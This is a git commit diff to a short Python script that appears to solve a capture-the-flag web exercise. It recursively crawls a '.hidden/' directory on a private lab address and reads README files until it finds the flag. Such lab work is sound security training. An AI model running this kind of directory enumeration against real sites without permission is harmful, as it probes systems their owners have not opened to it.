55a4673e4ec5f1646344501d8bc50d4434336d9c
Anas Benani <benanianas21@gmail.com>
2022-06-12 21:16:18 +0100

    all

--- hidden/Resources/getTheFlag.py
+++ hidden/Resources/getTheFlag.py
@@ -1,20 +1,20 @@
 import requests
 import re
 import sys
+import time
 
+sys.setrecursionlimit(3000)
 url = "http://10.13.100.223/.hidden/"
-# res = requests.get(url)
-# print(res.text.split('</h1>')[1])
-# res = list(dict.fromkeys(re.findall("[a-z]{26}", res.text)))
-# print(res)
+
 def find_flag(url):
-    file = requests.get(url+'README')
-    print(file.text)
-    if len(file.text) > 34:
-        sys.exit(file.text)  
+    readme = requests.get(url+'README')
+    print(readme.text.strip())
+    if len(readme.text.replace(" ", "")) > 30:
+        sys.exit(readme.text)  
     res = requests.get(url)
     res = list(dict.fromkeys(re.findall("[a-z]{26}", res.text.split('</h1>')[1])))
     for elm in res:
         find_flag(url+elm+'/')
+        time.sleep(0.005)
 
 find_flag(url)
